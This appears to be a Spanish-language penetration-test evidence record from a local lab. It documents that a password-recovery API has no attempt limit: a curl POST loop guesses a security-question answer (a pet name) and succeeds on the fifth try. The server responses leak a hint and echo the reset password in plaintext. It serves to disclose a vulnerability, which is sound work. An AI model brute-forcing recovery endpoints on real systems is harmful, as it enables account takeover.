# Evidencia evidencia_A07

```text
# Evidencia A07 - Recuperación de contraseña sin límite de intentos
# Fecha: 2026-10-04 03:40:20   Fase: fase1   Objetivo: localhost
# Comando: curl -i -s -X POST http://localhost:3000/api/recover-password (5 intentos con lista de respuestas)
# Esperado: Todos los intentos se procesan; el 5º acierta y cambia la contraseña (fuerza bruta viable)
# (newPassword = la misma contraseña original, para no alterar el laboratorio)
# ----------------------------------------------------------
>>> intento con respuesta 'rex'
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 117
ETag: W/"75-16gqjhpw8TaCL2SpJ8vqwa2DgNI"
Date: Sun, 04 Oct 2026 06:40:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"error":"Respuesta de seguridad incorrecta","hint":"La pregunta de seguridad es: nombre de tu mascota","attempts":1}

>>> intento con respuesta 'max'
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 117
ETag: W/"75-6XVOkxnGw30MOhXw8OnGM09MJmU"
Date: Sun, 04 Oct 2026 06:40:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"error":"Respuesta de seguridad incorrecta","hint":"La pregunta de seguridad es: nombre de tu mascota","attempts":2}

>>> intento con respuesta 'toby'
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 117
ETag: W/"75-tVmT7MRuHd9quCwBe2JAoBPoaJc"
Date: Sun, 04 Oct 2026 06:40:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"error":"Respuesta de seguridad incorrecta","hint":"La pregunta de seguridad es: nombre de tu mascota","attempts":3}

>>> intento con respuesta 'luna'
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 117
ETag: W/"75-/XG2sas608WdbZKVyZEgCrR2R7g"
Date: Sun, 04 Oct 2026 06:40:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"error":"Respuesta de seguridad incorrecta","hint":"La pregunta de seguridad es: nombre de tu mascota","attempts":4}

>>> intento con respuesta 'firulais'
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 75
ETag: W/"4b-zAtkQcIX/QQX3cT1p67AVM2FVwk"
Date: Sun, 04 Oct 2026 06:40:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"message":"Contrasena actualizada exitosamente","newPassword":"lopez2024"}

```
